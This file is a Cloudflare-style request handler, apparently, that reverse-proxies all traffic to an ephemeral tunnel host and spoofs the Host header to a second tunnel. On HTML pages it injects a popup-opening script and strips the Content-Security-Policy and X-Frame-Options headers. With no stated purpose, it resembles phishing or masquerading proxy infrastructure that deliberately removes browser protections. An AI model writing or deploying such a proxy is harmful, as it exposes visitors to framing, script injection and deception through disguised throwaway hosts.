export async function onRequest(context) {
  const incomingUrl = new URL(context.request.url)
  const target = new URL("https://experiment-cultures-unexpected-sympathy.trycloudflare.com")
  target.pathname = incomingUrl.pathname || ""
  target.search = incomingUrl.search

  const headers = new Headers(context.request.headers)
  headers.set("host", "6c642c4f7a9fbc4c1939eccc19418e91.loophole.site")

  const response = await fetch(target.toString(), {
    method: context.request.method,
    headers,
    body: context.request.body
  })

  const contentType = response.headers.get("content-type") || ""
  if (!contentType.includes("text/html")) {
    return response
  }

  let html = await response.text()

  const script = `
<script>
  if (!sessionStorage.getItem('_opened')) {
    sessionStorage.setItem('_opened', '1');
    window.open('about:blank', '_blank');
  }
<\/script>`

  html = html.replace(/<\/head>/i, script + '</head>')
  if (!/<\/head>/i.test(html)) html = script + html

  const newHeaders = new Headers(response.headers)
  newHeaders.delete("content-security-policy")
  newHeaders.delete("content-security-policy-report-only")
  newHeaders.delete("x-frame-options")
  newHeaders.set("content-type", "text/html; charset=utf-8")

  return new Response(html, {
    status: response.status,
    headers: newHeaders
  })
}
